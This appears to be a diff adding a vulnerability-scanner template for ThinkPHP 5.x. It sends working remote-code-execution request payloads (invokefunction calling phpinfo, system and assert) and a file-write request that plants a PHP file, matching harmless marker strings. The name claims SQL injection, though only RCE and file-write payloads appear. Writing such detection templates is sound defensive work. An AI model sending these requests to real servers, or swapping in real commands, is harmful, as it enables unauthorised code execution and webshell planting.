@@ -1,0 +1,70 @@
+id: thinkphp-sqli
+info:
+  name: ThinkPHP 5.x SQL Injection & RCE
+  severity: Critical
+  description: ThinkPHP 5.x 框架存在SQL注入和远程代码执行漏洞，攻击者可执行任意SQL语句或系统命令
+  reference:
+    - https://github.com/vulhub/vulhub/tree/master/thinkphp/in-sqlinjection
+    - https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce
+
+requests:
+  - method: GET
+    preconditions:
+      methods: [GET]
+    path:
+      - "{{BaseURL}}/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
+      - "{{BaseURL}}/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
+      - "{{BaseURL}}/index.php?s=index/think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
+      - "{{BaseURL}}/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
+    matchers:
+      - type: word
+        words:
+          - "PHP Version"
+          - "phpinfo()"
+          - "Configuration"
+        condition: or
+        part: body
+
+  - method: GET
+    preconditions:
+      methods: [GET]
+    path:
+      - "{{BaseURL}}/index.php?s=/index/\\think\\Request/input&filter[]=system&data=echo%20VULN_TEST_12345"
+      - "{{BaseURL}}/index.php?s=/index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20VULN_TEST_12345"
+    matchers:
+      - type: word
+        words:
+          - "VULN_TEST_12345"
+        part: body
+
+  - method: GET
+    preconditions:
+      methods: [GET]
+    path:
+      - "{{BaseURL}}/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()"
+      - "{{BaseURL}}/?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()"
+    matchers:
+      - type: word
+        words:
+          - "PHP Version"
+          - "phpinfo()"
+        condition: or
+        part: body
+      - type: status
+        status: [200]
+
+  - method: GET
+    preconditions:
+      methods: [GET]
+    path:
+      - "{{BaseURL}}/index.php?s=index/think\\template\\driver\\file/write&cacheFile=test.php&content=%3C%3Fphp%20echo%20VULN_TEST_SUCCESS%3B%3F%3E"
+    matchers:
+      - type: word
+        words:
+          - "success"
+          - "ok"
+          - "true"
+        condition: or
+        part: body
+      - type: status
+        status: [200, 201]
